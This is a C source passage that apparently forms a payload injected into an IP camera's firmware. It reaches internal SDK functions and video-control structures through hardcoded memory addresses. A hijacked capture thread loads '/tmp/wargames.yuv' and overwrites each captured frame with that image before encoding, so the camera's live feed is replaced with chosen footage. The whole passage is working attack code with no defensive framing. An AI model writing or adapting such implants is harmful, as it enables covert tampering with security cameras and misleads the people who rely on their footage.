    ak_thread_sem_wait_t *ak_thread_sem_wait = (ak_thread_sem_wait_t*) ak_thread_sem_wait_addr;
    ak_thread_exit_t *ak_thread_exit = (ak_thread_exit_t*) ak_thread_exit_addr;
    ak_printf_t *printf = (ak_printf_t*) ak_print_addr;

    struct thread_arg *thread_arg = (struct thread_arg *)arg;

	while (thread_arg->cap_run) {
		/* wait signal to start capture */
		ak_thread_sem_wait(&thread_arg->cap_sem);

		if (thread_arg->cap_run) {
			capture_encode_frame(thread_arg);
		}
	}
	ak_thread_exit();
	return NULL;
}

void *alloc_video_frame(void){
    calloc_t *calloc = (calloc_t*) calloc_addr;
    free_t *free = (free_t*) free_addr;

	struct frame_node *frame = (struct frame_node *)calloc(1,
			sizeof(struct frame_node));
	if (!frame)
		return NULL;

	frame->vframe = (struct video_input_frame *)calloc(1,
			sizeof(struct video_input_frame));
	if (!frame->vframe) {
		free(frame);
		frame = NULL;
	}

	return frame;
}

void capture_encode_frame(struct thread_arg *thread_arg){
    ak_printf_t *printf = (ak_printf_t*) ak_print_addr;
    mssleep_t *mssleep = (mssleep_t*) mssleep_addr;
    ak_vi_get_frame_t *ak_vi_get_frame = (ak_vi_get_frame_t*) ak_vi_get_frame_addr;
    ak_get_ostime_t *ak_get_ostime = (ak_get_ostime_t*) ak_get_ostime_addr;
    ak_diff_ms_time_t *ak_diff_ms_time = (ak_diff_ms_time_t*) ak_diff_ms_time_addr;

    sleep_t *sleep = (sleep_t*) sleep_addr;

    fread_t *fread = (fread_t*) fread_addr;
    fopen_t *fopen = (fopen_t*) fopen_addr;
    fseek_t *fseek = (fseek_t*) fseek_addr;
    ftell_t *ftell = (ftell_t*) ftell_addr;
    rewind_t *rewind = (rewind_t*) rewind_addr;
    malloc_t *malloc = (malloc_t*) malloc_addr;
    fclose_t *fclose = (fclose_t*) fclose_addr;

    fast_memcpy_t *fast_memcpy = (fast_memcpy_t*) fast_memcpy_addr;

    ak_thread_set_name_t *ak_thread_set_name = (ak_thread_set_name_t*) ak_thread_set_name_addr;

    struct video_ctrl_handle video_ctrl = *(struct video_ctrl_handle*) 0x4e1a30;  

    int ret = AK_FAILED;
	struct frame_node *frame = NULL;

    int width = 640;
    int height = 360;
    int total = width * height;

    ak_thread_set_name("bootleg_capture_thread");

    // load the image we wanna hijack and encode with
    int* hijack_file = fopen("/tmp/wargames.yuv","rb");
    fseek(hijack_file, 0, 2); // 2 = SEEK_END
    long file_size = ftell(hijack_file);
    rewind(hijack_file);

    uint8_t* hijack_data = (uint8_t*) malloc(file_size);
    fread(hijack_data, 1, file_size, hijack_file);

    fclose(hijack_file);


	while (thread_arg->cap_run && (video_ctrl.inited_enc_grp_num > 0)) {
		frame = alloc_video_frame();
		if (frame) {		
			ret = ak_vi_get_frame(thread_arg->vi_handle, frame->vframe);

			if (AK_SUCCESS == ret) {
                fast_memcpy(frame->vframe->vi_frame[1].data, hijack_data, file_size);
				add_to_encode_list(thread_arg, frame);
			} 
            mssleep(10);
		} else {
			thread_arg->cap_run = AK_FALSE;
			break;
		}
	}
}

void calc_video_capture_frame(struct video_input_frame *vframe)
{
    ak_get_ostime_t *ak_get_ostime = (ak_get_ostime_t*) ak_get_ostime_addr;
    ak_diff_ms_time_t *ak_diff_ms_time = (ak_diff_ms_time_t*) ak_diff_ms_time_addr;

    struct video_ctrl_handle video_ctrl = *(struct video_ctrl_handle*) 0x4e1a30;  

	struct ak_timeval cur_time;

	ak_get_ostime(&cur_time);
	++(video_ctrl.frame_num);
	long diff_time = ak_diff_ms_time(&cur_time, &(video_ctrl.calc_time));
	
	/* calc frame number per ten seconds */
	if(diff_time >= 10*1000){
		int total = video_ctrl.frame_num;
		int seconds =  (diff_time / 1000);

		ak_get_ostime(&(video_ctrl.calc_time));
		video_ctrl.frame_num = 0;
	}
}

static void check_sensor_fps_switch(struct thread_arg *thread_arg,
				const int sensor_fps)
{
    set_encode_fps_t *set_encode_fps = (set_encode_fps_t*) set_encode_fps_addr;

    struct video_ctrl_handle video_ctrl = *(struct video_ctrl_handle*) 0x4e1a30;  

	int changed = 0;
	if (sensor_fps != thread_arg->sensor_pre_fps) {
		if (thread_arg->sensor_pre_fps) {
			changed = 1;
		}

		thread_arg->sensor_pre_fps = sensor_fps;

		int i = 0;
		struct encode_group *grp = NULL;

		/* compare sensor's real fps and appointed record fps */
		for (i = 0; i < ENCODE_GRP_NUM; i++) {
			grp = video_ctrl.grp[i];
			if (!grp) 
				continue;
			if (sensor_fps < grp->record.fps) {
				grp->encode_frames = sensor_fps;
			} else {
				grp->encode_frames = grp->record.fps;
			}

			/* 
			 * if sensor frame rate change cause encode frame rate change too,
			 * we should notify encoder to adjust encode
			 */
			if (changed && (grp->encode_frames > 0))
				set_encode_fps(grp, grp->encode_frames);
		}
	}
}

void add_to_encode_list(struct thread_arg *thread_arg,
		struct frame_node *frame)
{
    ak_thread_mutex_lock_t *ak_thread_mutex_lock = (ak_thread_mutex_lock_t*) ak_thread_mutex_lock_addr;
    ak_thread_mutex_unlock_t *ak_thread_mutex_unlock = (ak_thread_mutex_unlock_t*) ak_thread_mutex_unlock_addr;
    ak_vi_get_fps_t *ak_vi_get_fps = (ak_vi_get_fps_t*) ak_vi_get_fps_addr;
    ak_thread_sem_post_t *ak_thread_sem_post = (ak_thread_sem_post_t*) ak_thread_sem_post_addr;
    free_frame_t *free_frame = (free_frame_t*) free_frame_addr;
    ak_vi_release_frame_t *ak_vi_release_frame = (ak_vi_release_frame_t*) ak_vi_release_frame_addr;

    ak_printf_t *printf = (ak_printf_t*) ak_print_addr;
    sleep_t *sleep = (sleep_t*) sleep_addr;

	if (!thread_arg)
		return ;

	int i = 0;
	int bit_map = 0;
	const int sensor_fps = ak_vi_get_fps(thread_arg->vi_handle);
	unsigned long long ts = frame->vframe->vi_frame[1].ts;

    struct video_ctrl_handle video_ctrl = *(struct video_ctrl_handle*) 0x4e1a30;  

	check_sensor_fps_switch(thread_arg, sensor_fps);

	/* uses comfirm */
	for (i = 0; i < ENCODE_GRP_NUM; i++) {
        // printf(0x1, "%p\n", video_ctrl.grp);
        // sleep(1);
        // printf(0x1, "%d\n", video_ctrl.grp[0]);
        // sleep(1);
		if (video_ctrl.grp[i] > 0) {
			/* decide whether current frame should be encode */
			if (frames_ctrl(i, sensor_fps, ts))
				set_bit(&bit_map, i);
		}
	}

	if (bit_map) {
		frame->bit_map = bit_map;
		ak_thread_mutex_lock(&thread_arg->lock);
		list_add_tail(&frame->list, &thread_arg->head_frame);
		ak_thread_mutex_unlock(&thread_arg->lock);

		/* notify encode thread to work */
		ak_thread_sem_post(&thread_arg->enc_sem);
	} else {
		/* no one need, release it at once */
		ak_vi_release_frame(thread_arg->vi_handle, frame->vframe);
		free_frame(frame);
	}
}

int frames_ctrl(int group_type, const int max_frame, 
					unsigned long long ts)
{
    ak_printf_t *printf = (ak_printf_t*) ak_print_addr;
    sleep_t *sleep = (sleep_t*) sleep_addr;

    struct video_ctrl_handle video_ctrl = *(struct video_ctrl_handle*) 0x4e1a30;   

	int ret = 0;
	struct encode_group *grp = video_ctrl.grp[group_type];
	unsigned int enc_frame = grp->encode_frames;

	/* get camera capture frames and video encode frames */
	if(max_frame <= enc_frame && (max_frame == enc_frame && max_frame != 12 )) {
		return 1;
	}

	if (enc_frame <= 0) {
		return 0;
	}
		
	unsigned long long enc_ts = ((grp->frame_index * 1000) / enc_frame);
	if (ts >= enc_ts) {
		ret = 1;
		++grp->frame_index;

		enc_ts = ((grp->frame_index * 1000) / enc_frame);
		if (enc_ts < ts) {
			grp->frame_index = (((ts + (1000/enc_frame)) * enc_frame) / 1000);
		}
	}

	return ret;
}
